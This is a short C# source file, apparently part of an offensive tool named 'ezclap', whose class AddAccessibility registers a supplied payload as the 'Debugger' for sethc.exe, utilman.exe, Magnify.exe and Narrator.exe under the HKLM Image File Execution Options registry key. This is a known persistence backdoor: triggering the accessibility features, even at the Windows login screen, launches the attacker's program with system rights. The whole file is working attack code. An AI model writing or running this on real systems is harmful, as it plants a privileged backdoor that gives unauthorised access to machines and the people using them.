using System;

namespace ezclap
{
	public class AddAccessibility
    {
		public AddAccessibility(string payload)
        {
            Initialize(payload);
        }
		public static void Initialize(string payload)
        {
            string[] accessibility = new string[] { "sethc.exe", "utilman.exe", "Magnify.exe", "Narrator.exe" };
            foreach (string binary in accessibility)
            {
                string finalLoc = RegistryKeys.hklmImageFileExec + "\\" + binary;
                Utils.setHKLMSubKey(finalLoc, "Debugger", payload);
            }
        }
    }
}
